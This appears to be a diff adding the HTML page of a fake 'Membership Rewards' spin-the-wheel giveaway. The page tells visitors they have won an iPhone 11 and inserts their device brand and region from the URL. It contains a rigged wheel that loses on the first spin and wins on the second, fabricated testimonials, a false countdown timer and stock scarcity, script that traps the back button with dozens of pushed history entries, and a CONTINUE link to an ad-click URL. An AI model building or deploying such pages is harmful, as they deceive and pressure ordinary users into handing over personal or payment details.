@@ -1,0 +1,961 @@
+<html webdriver="true">
+
+<head>
+	<base href="">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+	<meta name="robots" content="noindex, nofollow, noarchive">
+	 
+	<title>[1] Gift Pending!</title>
+	<style>
+	.wrapper {
+		text-align: center
+	}
+	.button {
+		position: relative
+	}
+	.subheader {
+		display: none
+	}
+	.prize table {
+		margin: 0 auto
+	}
+	.contestwrap table,
+	td,
+	tr {
+		border-collapse: collapse
+	}
+	html {
+		font-family: sans-serif;
+		font-color: #000;
+		-webkit-text-size-adjust: 100%;
+		-ms-text-size-adjust: 100%
+	}
+	body {
+		margin: 0;
+		background: #f7f7f7;
+		min-width: 320px;
+		color: #000
+	}
+	a,
+	div,
+	h2,
+	h3,
+	p,
+	span {
+		margin: 0;
+		padding: 0
+	}
+	a {
+		text-decoration: none;
+		color: #4485f6
+	}
+	h3 {
+		color: #212121
+	}
+	p {
+		color: #737373
+	}
+	.header {
+		z-index: 9999;
+		display: block;
+		padding-top: 10px;
+		width: 100%;
+		height: 44px;
+		background-color: #232f3e
+	}
+	.wrapper {
+		max-width: 800px;
+		width: 96%;
+		margin: 0 auto
+	}
+	.contestwrap {
+		background-color: #fff
+	}
+	.subheader {
+		background: rgba(0, 0, 0, .03);
+		width: 100%;
+		border-bottom: 1px solid rgba(0, 0, 0, .05)
+	}
+	.contestwrap,
+	.reviews {
+		border-bottom: 1px solid #e5e5e5
+	}
+	td,
+	tr {
+		padding: 8px 0 4px
+	}
+	.spacer {
+		height: 20px
+	}
+	.contestwrap {
+		box-shadow: 0 0 2px 2px #d2d2d2;
+		padding: 10px 0 4px;
+		border-radius: 3px
+	}
+	.contestwrap {
+		-webkit-box-shadow: 0 0 2px 2px #d2d2d2;
+		-moz-box-shadow: 0 0 2px 2px #d2d2d2
+	}
+	.toptext {
+		color: #212121;
+		font-size: small
+	}
+	.contestwrap p {
+		color: #776161;
+		font-size: small
+	}
+	.reviews {
+		box-shadow: 0 0 2px 2px #d2d2d2
+	}
+	.prize {
+		width: 100%
+	}
+	.reviews {
+		-webkit-box-shadow: 0 0 2px 2px #d2d2d2;
+		-moz-box-shadow: 0 0 2px 2px #d2d2d2
+	}
+	.button {
+		top: 10px;
+		border: 1px solid;
+		padding: 10px 35px;
+		font-size: .9em;
+		color: #000;
+		background: #f1c860;
+		background: -webkit-linear-gradient(top, #f5d78e, #eeb933);
+		background: linear-gradient(to bottom, #f5d78e, #eeb933);
+		-webkit-border-radius: 3px;
+		-moz-border-radius: 3px;
+		border-radius: 3px
+	}
+	.logo,
+	.ricon1 {
+		position: absolute;
+		display: block;
+		background-repeat: no-repeat
+	}
+	.reviews {
+		background-color: #fff;
+		padding: 0;
+		border-radius: 3px
+	}
+	hr {
+		opacity: .2
+	}
+	.reviews .name {
+		font-weight: 700;
+		color: #333
+	}
+	.reviews .text {
+		padding-top: 5px;
+		padding-bottom: 5px;
+		color: #555;
+		font-style: italic
+	}
+	.reviews .date {
+		padding-top: 5px;
+		color: #888a89;
+		font-size: 10px
+	}
+	.reviews table {
+		font-size: small;
+		padding: 0
+	}
+	.roundimg {
+		border-radius: 50%;
+		width: 50px
+	}
+	.reviews h2 {
+		font-size: 1.2em;
+		font-weight: 300;
+		padding: 20px 0 5px
+	}
+	.commentpad {
+		padding-left: 10px
+	}
+	.reviews hr {
+		opacity: 0
+	}
+	.ricon1 {
+		background-image: url(icon-right.png);
+		background-position: right;
+		background-size: 39px 28px;
+		width: 39px;
+		height: 28px;
+		right: 10px;
+		top: 14px
+	}
+	#pressButton {
+		cursor: pointer
+	}
+	.spinAround,
+	.spinAround2 {
+		animation-timing-function: ease;
+		animation-iteration-count: 1;
+		animation-direction: normal
+	}
+	#wheelCon,
+	.sweet-alert {
+		overflow: hidden
+	}
+	.sweet-alert,
+	.sweet-overlay {
+		position: fixed;
+		display: none
+	}
+	a {
+		text-decoration: none
+	}
+	.sweet-overlay {
+		background-color: #000;
+		-ms-filter: alpha(opacity=40);
+		background-color: rgba(0, 0, 0, .4);
+		left: 0;
+		right: 0;
+		top: 0;
+		bottom: 0;
+		z-index: 10000
+	}
+	.sweet-alert {
+		border: 2px solid #ffa400;
+		background-color: #fff;
+		font-family: open sans, helvetica neue, Helvetica, Arial, sans-serif;
+		width: 478px;
+		padding: 17px;
+		border-radius: 5px;
+		text-align: center;
+		left: 50%;
+		top: 50%;
+		margin-left: -256px;
+		margin-top: -150px;
+		z-index: 99999
+	}
+	.sweet-alert h2,
+	.sweet-alert p {
+		padding: 10px 0 0;
+		position: relative
+	}
+	@media all and (max-width: 540px) {
+		.sweet-alert {
+			width: auto;
+			margin-left: 0;
+			margin-right: 0;
+			left: 15px;
+			right: 15px
+		}
+	}
+	.sweet-alert h2 {
+		color: #575757;
+		font-size: 20px;
+		text-align: center;
+		font-weight: 600;
+		text-transform: none;
+		margin: 25px 0;
+		line-height: 30px;
+		display: block
+	}
+	.sweet-alert p {
+		color: #797979;
+		font-size: 15px;
+		font-weight: 300;
+		text-align: inherit;
+		float: none;
+		margin: 0;
+		line-height: normal
+	}
+	a {
+		text-align: center
+	}
+	.sweet-alert .sa-confirm-button-container {
+		display: inline-block;
+		position: relative
+	}
+	.la-ball-fall,
+	.visible {
+		display: block
+	}
+	.sweet-alert .la-ball-fall {
+		position: absolute;
+		left: 50%;
+		top: 50%;
+		margin-left: -27px;
+		margin-top: 4px;
+		opacity: 0;
+		visibility: hidden
+	}
+	.sweet-alert button {
+		background-color: #e84242;
+		color: #fff;
+		border: 0;
+		box-shadow: none;
+		font-size: 17px;
+		font-weight: 500;
+		-webkit-border-radius: 4px;
+		border-radius: 5px;
+		padding: 10px 32px;
+		margin: 10px 5px 0;
+		cursor: pointer
+	}
+	.sweet-alert button:focus {
+		outline: 0;
+		box-shadow: 0 0 2px rgba(128, 179, 235, .5), inset 0 0 0 1px rgba(0, 0, 0, .05)
+	}
+	.sweet-alert button:hover {
+		background-color: #7ecff4
+	}
+	.sweet-alert button:active {
+		background-color: #5dc2f1
+	}
+	.sweet-alert button::-moz-focus-inner {
+		border: 0
+	}
+	#pressButton,
+	#wheelCon {
+		background-size: contain
+	}
+	#firstpage,
+	#wheelCon,
+	.congrats,
+	.prize,
+	.timer {
+		background-color: #fff
+	}
+	#devMockup,
+	#secondpage {
+		display: none
+	}
+	#firstpage,
+	#wheelCon,
+	.congrats,
+	.prize,
+	.timer {
+		border-radius: 3px
+	}
+	#firstpage {
+		margin-bottom: 5px;
+		padding-top: 5px
+	}
+	.name {
+		font-weight: 700
+	}
+	.date {
+		font-size: .85em;
+		color: #9c9c9c;
+		margin: 2px 0
+	}
+	.name {
+		color: #3c5a96
+	}
+	#wheelCon {
+		position: relative;
+		background-position: center;
+		background-repeat: no-repeat
+	}
+	#wheel {
+		z-index: 1;
+		width: 100%;
+		height: auto;
+		margin-top: 5px
+	}
+	#pressButton {
+		position: absolute;
+		background-image: url(spin_prize2.png);
+		width: 25%;
+		height: 0;
+		padding-top: 30.5%;
+		z-index: 2;
+		margin-left: auto;
+		margin-right: auto;
+		left: 0;
+		right: 0;
+		top: 110px
+	}
+	#devMockup {
+		position: absolute;
+		max-width: 40%;
+		height: auto;
+		z-index: 3
+	}
+	.congrats {
+		text-align: center
+	}
+	.name {
+		font-size: 100%
+	}
+	a.button {
+		text-decoration: none
+	}
+	.fbimg {
+		margin: 10px 0 5px
+	}
+	.prize {
+		margin-bottom: 5px
+	}
+	.timer {
+		line-height: 1.5
+	}
+	.spinAround {
+		-webkit-animation: spin 6.6s;
+		-webkit-animation-fill-mode: forwards;
+		-moz-animation-fill-mode: forwards;
+		-o-animation-fill-mode: forwards;
+		-ms-animation-fill-mode: forwards;
+		animation-fill-mode: forwards
+	}
+	@-webkit-keyframes spin {
+		0% {
+			-webkit-transform: rotate(0);
+			-ms-transform: rotate(0);
+			transform: rotate(0)
+		}
+		90% {
+			-webkit-transform: rotate(3110deg);
+			-ms-transform: rotate(3110deg);
+			transform: rotate(3110deg)
+		}
+		95% {
+			-webkit-transform: rotate(3108deg);
+			-ms-transform: rotate(3108deg);
+			transform: rotate(3108deg)
+		}
+		100% {
+			-webkit-transform: rotate(3109deg);
+			-ms-transform: rotate(3109deg);
+			transform: rotate(3109deg)
+		}
+	}
+	.spinAround2 {
+		-webkit-animation: spin2 6.6s;
+		-webkit-animation-fill-mode: forwards;
+		-moz-animation-fill-mode: forwards;
+		-o-animation-fill-mode: forwards;
+		-ms-animation-fill-mode: forwards;
+		animation-fill-mode: forwards
+	}
+	@-webkit-keyframes spin2 {
+		0% {
+			-webkit-transform: rotate(3109deg);
+			-ms-transform: rotate(3109deg);
+			transform: rotate(3109deg)
+		}
+		90% {
+			-webkit-transform: rotate(6314deg);
+			-ms-transform: rotate(6314deg);
+			transform: rotate(6314deg)
+		}
+		95% {
+			-webkit-transform: rotate(6312deg);
+			-ms-transform: rotate(6312deg);
+			transform: rotate(6312deg)
+		}
+		100% {
+			-webkit-transform: rotate(6313deg);
+			-ms-transform: rotate(6313deg);
+			transform: rotate(6313deg)
+		}
+	}
+	.animated {
+		-webkit-animation-duration: 1s;
+		animation-duration: 1s;
+		-webkit-animation-fill-mode: both;
+		animation-fill-mode: both
+	}
+	@-webkit-keyframes rotateIn {
+		0% {
+			-webkit-transform-origin: center;
+			transform-origin: center;
+			-webkit-transform: rotate3d(0, 0, 1, -200deg);
+			transform: rotate3d(0, 0, 1, -200deg);
+			opacity: 0
+		}
+		100% {
+			-webkit-transform-origin: center;
+			transform-origin: center;
+			-webkit-transform: none;
+			transform: none;
+			opacity: 1
+		}
+	}
+	@keyframes rotateIn {
+		0% {
+			-webkit-transform-origin: center;
+			transform-origin: center;
+			-webkit-transform: rotate3d(0, 0, 1, -200deg);
+			transform: rotate3d(0, 0, 1, -200deg);
+			opacity: 0
+		}
+		100% {
+			-webkit-transform-origin: center;
+			transform-origin: center;
+			-webkit-transform: none;
+			transform: none;
+			opacity: 1
+		}
+	}
+	.rotateIn {
+		-webkit-animation-name: rotateIn;
+		animation-name: rotateIn
+	}
+	.transparent {
+		opacity: .6;
+		filter: alpha(opacity=60)
+	}
+	@media(min-width:614px) {
+		#wheel {
+			width: 27vw;
+			left: 47vw;
+			top: 27vw
+		}
+		#pressButton {
+			width: 6%;
+			top: 38%!important;
+			background-repeat: no-repeat
+		}
+	}
+	body {
+		background: #f1f1f1;
+		margin: 0;
+		padding: 0;
+		font-family: helvetica, arial, sans-serif;
+		font-size: small
+	}
+	.toptext {
+		background: #fff
+	}
+	.bounce {
+		display: inline-block;
+		-webkit-animation: a .6s ease infinite;
+		animation: a .6s ease infinite;
+		color: #ffa400
+	}
+	@-webkit-keyframes a {
+		0%, to {
+			-webkit-transform: translate3d(0, -5px, 0);
+			transform: translate3d(0, -5px, 0)
+		}
+		80% {
+			-webkit-transform: translate3d(0, 5px, 0);
+			transform: translate3d(0, 5px, 0)
+		}
+	}
+	@keyframes a {
+		0%, to {
+			-webkit-transform: translate3d(0, -5px, 0);
+			transform: translate3d(0, -5px, 0)
+		}
+		80% {
+			-webkit-transform: translate3d(0, 5px, 0);
+			transform: translate3d(0, 5px, 0)
+		}
+	}
+	.contestwrap {
+		margin-bottom: 5px
+	}
+	.toptext {
+		min-height: 40px;
+		color: #1e2330;
+		font-size: 11px;
+		padding: 8px;
+		border-radius: 3px
+	}
+	.logo {
+		display: block
+	}
+	td {
+		background-color: transparent;
+		-webkit-transition: all .3s ease-in;
+		-moz-transition: all .3s ease-in;
+		-ms-transition: all .3s ease-in;
+		-o-transition: all .3s ease-in;
+		transition: all .3s ease-in
+	}
+	hr {
+		height: 0;
+		font-size: 0;
+		line-height: 0;
+		border: 0;
+		background: 0;
+		border-bottom: 1px #dadde1 solid
+	}
+	.logo {
+		margin: 4px auto
+	}
+	hr {
+		margin: 0 5px
+	}
+	</style>
+	<script>
+	function contains(c, d) {
+		c = c.toLowerCase();
+		d = d.toLowerCase();
+		return c.indexOf(d) !== -1
+	}
+
+	function getURLParameter(c) {
+		var d = decodeURI((RegExp(c + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "");
+		if(c.indexOf("brand") !== -1 && contains(d, "generic")) {
+			d = "Phone"
+		}
+		if(c.indexOf("model") !== -1 && contains(d, "android")) {
+			d = "Phone"
+		}
+		if(c.indexOf("browser") !== -1 && contains(d, "android")) {
+			d = "Internet Browser"
+		}
+		return d
+	}
+	setTimeout(function() {
+		alert("Congratulations " + getURLParameter("brand") + " user!\n\nWe have specially selected you to receive rewards for your loyalty.\n\nThis gift is exclusive to " + getURLParameter("brand") + " users in " + getURLParameter("region") + ".\n\nClick OK to confirm.\n")
+	}, 200); /*]]>*/
+	</script>
+	<link rel="icon" href="data:;base64,iVBORw0KGgo="> </head>
+
+<body onload="setButtonHeight(),autospin1()">
+	<style>
+	.button {
+		cursor: pointer
+	}
+	.logo {
+		left: 10px;
+		width: 36px;
+		height: 30px;
+		background-image: url(mnu2.png);
+		background-size: 31px 31px;
+		background-position: center center
+	}
+	</style>
+	<div class="header">
+		<div class="logo"></div>
+		<div class="ricon1"></div>
+		<div class="ricon2"></div>
+	</div>
+	<div class="subheader"><span class="subheadertitle">Membership Rewards</span>
+	</div>
+	<div class="spacer"></div>
+	<div class="wrapper">
+		<div id="container" class="contestwrap wrapper">
+			<div id="firstpage" class="toptext">
+				<table class="wrapper">
+					<tbody>
+						<tr>
+							<td align="center" valign="top"><b>Congratulations <span class="get_brand"></span> User, you have (1) Reward Pending!<br></b>
+								<br> <font style="color:#9fa2a6;font-size:x-small"><span class="today_date_full">August 18, 2020</span></font> </td>
+						</tr>
+					</tbody>
+				</table>
+				<div>
+					<p class="wrapper">Every <span class="today_readable">Tuesday</span> we choose 10 lucky users randomly from <span class="get_region"></span> to receive a reward. This is our way to thank you for your continuing support for our products and services!
+						<br>
+						<br>
+					</p>
+					<div class="yo" style="background-color:#232f3e;color:#fff;border-radius:0;margin:0;padding:0;padding-bottom:10px;margin-top:7px;padding-top:5px;width:100%">
+						<h2 style="margin:0;padding:0;padding-bottom:3px">Claim Your Prize</h2>
+						<h2 style="margin:0;padding:0"><span class="bounce">↓</span> Spin the wheel <span class="bounce">↓</span></h2> </div>
+					<br>
+					<br>
+					<p></p>
+				</div>
+				<div id="wheelCon"><img id="wheel" src="images/spin1kbp.png" width="330" height="330" class="spinAround2 transparent">
+					<div id="pressButton" style="top: 102.9px;"></div>
+					<div><img id="devMockup" class="animated rotateIn" src="images/iphone.png" width="140" height="280" style="left:98.5px;top:125px">
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="spacer"></div>
+		<div class="reviews wrapper">
+			<div class="wrapper">
+				<h2>Comments:</h2> </div>
+			<table class="wrapper" style="padding-top:8px">
+				<tbody>
+					<tr>
+						<td width="50px" valign="top" align="right"><img class="roundimg" src="images/c18.jpg">
+						</td>
+						<td align="left" valign="top" class="commentpad">
+							<div class="name">Alvin Tracy</div>
+							<div class="text">Fantastic! I've never won anything, but I am lucky!!</div>
+							<div class="date"><span class="today_date">August 18</span>
+							</div>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			<hr>
+			<table class="wrapper">
+				<tbody>
+					<tr>
+						<td width="50px" valign="top" align="right"><img class="roundimg" src="images/c15.jpg">
+						</td>
+						<td align="left" valign="top" class="commentpad">
+							<div class="name">Frank Bartlett</div>
+							<div class="text">It was easy, hope i get the PS4...</div>
+							<div class="date"><span class="today_date_minus_2">August 16</span>
+							</div>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			<hr>
+			<table class="wrapper">
+				<tbody>
+					<tr>
+						<td width="50px" valign="top" align="right"><img class="roundimg" src="images/c16.jpg">
+						</td>
+						<td align="left" valign="top" class="commentpad">
+							<div class="name">Linda Moore</div>
+							<div class="text">Saw this one time offer and clicked it off because I thought it was fake. I saw the ad again and because I was bored so I decided to try it ... And I got a NEW iPhone 11! What!!?!</div>
+							<div class="date"><span class="today_date_minus_2">August 16</span>
+							</div>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			<hr>
+			<table class="wrapper">
+				<tbody>
+					<tr>
+						<td width="50px" valign="top" align="right"><img class="roundimg" src="images/c14.jpg">
+						</td>
+						<td align="left" valign="top" class="commentpad">
+							<div class="name">Ted Meyer</div>
+							<div class="text">Today there was a delivery! I gave the iPhone 11 to my lovely wife for her birthday... Love u babe )</div>
+							<div class="date"><span class="today_date_minus_2">August 16</span>
+							</div>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			<hr>
+			<table class="wrapper">
+				<tbody>
+					<tr>
+						<td width="50px" valign="top" align="right"><img class="roundimg" src="images/c11.jpg">
+						</td>
+						<td align="left" valign="top" class="commentpad">
+							<div class="name">Rosemary Peters</div>
+							<div class="text">My iPhone 11 came in the mail today!! I am amazed and grateful!!</div>
+							<div class="date"><span class="today_date_minus_2">August 16</span>
+							</div>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			<hr>
+			<table class="wrapper">
+				<tbody>
+					<tr>
+						<td width="50px" valign="top" align="right"><img class="roundimg" src="images/c12.jpg">
+						</td>
+						<td align="left" valign="top" class="commentpad">
+							<div class="name">Vanessa Welker</div>
+							<div class="text">I thought this was a joke at first, but my iPhone 11 actually came into my mail this morning. #legit</div>
+							<div class="date"><span class="today_date_minus_2">August 16</span>
+							</div>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			<hr>
+			<table class="wrapper">
+				<tbody>
+					<tr>
+						<td width="50px" valign="top" align="right"><img class="roundimg" src="images/c17.jpg">
+						</td>
+						<td align="left" valign="top" class="commentpad">
+							<div class="name">Larry Vann</div>
+							<div class="text">Thanks, I have given the PS4 to my brother for his birthday. Lol :D :D :D God Blessed.</div>
+							<div class="date"><span class="today_date_minus_3">August 15</span>
+							</div>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			<hr>
+			<table class="wrapper">
+				<tbody>
+					<tr>
+						<td width="50px" valign="top" align="right"><img class="roundimg" src="images/c13.jpg">
+						</td>
+						<td align="left" valign="top" class="commentpad">
+							<div class="name">Jesse Spikes</div>
+							<div class="text">I'm not a gamer, but I just chose the PS4! Why not?! LOL</div>
+							<div class="date"><span class="today_date_minus_4">August 14</span>
+							</div>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+		</div>
+	</div>
+	<div style="height:40px"></div>
+	<div id="secondpage" class="wrapper">
+		<div class="congrats" style="padding-top:5px">
+			<a href="#" target="_blank">
+				<h3>
+<font color="#3c5a96">Congratulations!<br>(1)
+<font style="color:red;font-weight:700">iPhone 11 </font>is reserved for you!</font>
+</h3> </a>
+		</div>
+		<a href="#" target="_blank">
+			<div class="congrats" style="text-align:left;margin-top:5px;margin-left:5px">
+				<p><b>Step 1:</b> Click the "CONTINUE" button.</p>
+				<p><b>Step 2:</b> Confirm your delivery</p>
+				<p><em><b>*no contact safe delivery</b></em>
+				</p>
+				<p> </p>
+				<p style="padding-top:10px"><b>Important:</b> Hurry, limited quantities only.</p>
+			</div>
+			<div class="timer" style="margin-top:5px;margin-left:5px">You only have <font color="green"><b><span id="mins">5</span> minutes <span id="hsecs">30</span> seconds to claim your prize!</b></font> </div>
+			<div class="prize">
+				<table>
+					<tbody>
+						<tr>
+							<th></th>
+							<td style="padding:10px 5px 10px 0;text-align:center"><img src="images/1kbp.png" style="max-width:100px">
+								<p><b>2 remaining!</b>
+								</p>
+							</td>
+							<td style="line-height:1.6">
+								<p style="text-align:left"><span class="name">Apple iPhone 11, 64GB, Black</span>
+								</p>
+								<div><a href="https://blast.radadpro.com/click" rel="noreferrer" class="button">CONTINUE</a>
+								</div>
+							</td>
+						</tr>
+					</tbody>
+				</table>
+			</div>
+		</a>
+	</div>
+	<div class="sweet-overlay" style="opacity:1.03;display:block" tabindex="-1"></div>
+	<div class="sweet-alert animated bounceIn visible" id="modal01" style="top: 38%;">
+	    <img id="gift-image" src="images/gift.gif" style="width:70px"> <img id="gift-image2" src="images/refresh.png" style="width:70px;display:none">
+		<h2 id="first-title" style="margin-top:-10px;margin-bottom:0">Membership Rewards Event</h2>
+		<p id="first-dialog"> 
+		</p>
+		<p> </p>
+		<p></p>
+		<p></p>
+		<p></p>
+		<p></p>
+		<div class="sa-button-container">
+			<div class="sa-confirm-button-container">
+				<button onclick="hidemodal01()" style="display:inline-block;box-shadow:rgba(140,212,245,.8) 0 0 2px,rgba(0,0,0,.0470588) 0 0 0 1px inset;background-color:#ffa400;color:#232f3e">OK</button>
+				<div class="la-ball-fall"></div>
+			</div>
+		</div>
+	</div>
+	<script>
+	/*<![CDATA[*/
+	function getDate(g, b, k) {
+		var f = new Date;
+		f.setDate(f.getDate() - g);
+		var h = f.getDate();
+		h < 10 && (h = "0" + h);
+		var j = f.getMonth(),
+			c = f.getFullYear();
+		return b ? p[f.getDay()] : k ? n[j] + " " + h + ", " + c : n[j] + " " + h
+	}
+
+	function addText(d, c) {
+		for(var b = document.getElementsByClassName(d), a = 0; a < b.length; a++) {
+			b[a].innerText = c
+		}
+	}
+
+	function hidemodal01() {
+		document.getElementById("modal01").classList.remove("visible"), document.querySelector(".sweet-overlay").style.display = "none", spin()
+	}
+
+	function showmodal01() {
+		document.getElementById("modal01").classList.add("visible"), document.querySelector(".sweet-overlay").style.display = "float"
+	}
+
+	function hidemodal02() {
+		vibr > 0 && navigator.vibrate(70), document.getElementById("modal02").classList.remove("visible"), document.querySelector(".sweet-overlay").style.display = "none"
+	}
+
+	function setButtonHeight() {
+		conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top = conMid - button.offsetHeight / 2 - 0.2 * button.offsetHeight / 2 + "px"
+	}
+
+	function spin() {
+		switch(count) {
+			case 1:
+				dWheel.className = "spinAround", setTimeout(function() {
+					document.getElementById("gift-image").style.display = "none", document.getElementById("gift-image2").style.display = "", document.getElementById("first-title").innerHTML = "Try again!", document.getElementById("first-dialog").innerHTML = "Sorry.<p>Please try again. You have 1 more chance!", document.getElementById("modal01").style.top = "55%", showmodal01()
+				}, 6800);
+				break;
+			case 2:
+				dWheel.className = "spinAround2", setTimeout(function() {
+					dWheel.className = dWheel.className + " transparent"
+				}, 6800), setTimeout(function() {
+					device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
+				}, 7000), setTimeout(function() {
+					first.innerHTML = "<img src='images/loading.gif'>", first.style.padding = "195px 0px", setTimeout(function() {
+						first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con.firstChild), setInterval("countdown()", 1000)
+					}, 1500)
+				}, 9000)
+		}
+		count++
+	}
+
+	function autospin1() {
+		document.getElementById("pressButton").disabled = !0, document.getElementById("first-title").
+		innerHTML = "Membership Rewards Event", document.getElementById("first-dialog").innerHTML = "<b>" + getDate(0) + ", 2020</b><p> Congratulations " + getURLParameter("brand") + " user! 🎉</p><p>National Consumer Center would like to thank you for your loyalty to " + getURLParameter("brand") + " - so we are offering you the chance to receive a reward.<p>Spin the wheel to claim your special prize 🎁<br><br><b>Good Luck!</b>", document.getElementById("modal01").style.top = "38%"
+	}
+
+	function autospin2() {
+		spin()
+	}
+
+	function speak(c) {
+		var b = new SpeechSynthesisUtterance,
+			a = speechSynthesis.getVoices();
+		b.voice = a[6], b.voiceURI = "native", b.volume = 1, b.rate = 1, b.pitch = 1, b.text = c, b.lang = "en-US", speechSynthesis.speak(b)
+	}
+
+	function countdown() {
+		var b = parseInt(document.getElementById("mins").innerHTML),
+			a = parseInt(document.getElementById("hsecs").innerHTML);
+		0 != b && 0 == a ? (nmins = b - 1, nsecs = 59) : 0 != b || 0 != a ? (nmins = b, nsecs = a - 1) : 0 == b && 0 == a && (nmins = b, nsecs = a), document.getElementById("mins").innerHTML = nmins, document.getElementById("hsecs").innerHTML = nsecs, nsecs < 10 && (nsecs = "0" + nsecs)
+	}
+
+	function exit_a1() {
+		window.onbeforeunload = null, window.location = window.location.href
+	}! function() {
+		var a;
+		try {
+			for(a = 0; 30 > a; ++a) {
+				history.pushState({}, "", "")
+			}
+			onpopstate = function(b) {
+				b.state && location.replace(window.location.href)
+			}
+		} catch(a) {}
+	}();
+	var p = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"),
+		n = new Array("January", "June", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+	addText("today_readable", getDate(0, !0)), addText("today_date", getDate(0)), addText("today_date_minus_2", getDate(2)), addText("today_date_minus_3", getDate(3)), addText("today_date_minus_4", getDate(4)), addText("today_date_full", getDate(0, !1, !0)), addText("get_region", getURLParameter("region")), addText("get_brand", getURLParameter("brand"));
+	var conMid, mydate = new Date,
+		year = mydate.getFullYear(),
+		day = mydate.getDate(),
+		weekday = mydate.getDay(),
+		count = 1,
+		headline = document.getElementById("headline"),
+		today = document.getElementById("today"),
+		con = document.getElementById("container"),
+		whCon = document.getElementById("wheelCon"),
+		dWheel = document.getElementById("wheel"),
+		button = document.getElementById("pressButton"),
+		device = document.getElementById("devMockup"),
+		first = document.getElementById("firstpage"),
+		second = document.getElementById("secondpage");
+	speak("Congratulations!"); /*]]>*/
+	</script>
+	 
+	 
+	 
+</body>
+
+</html>
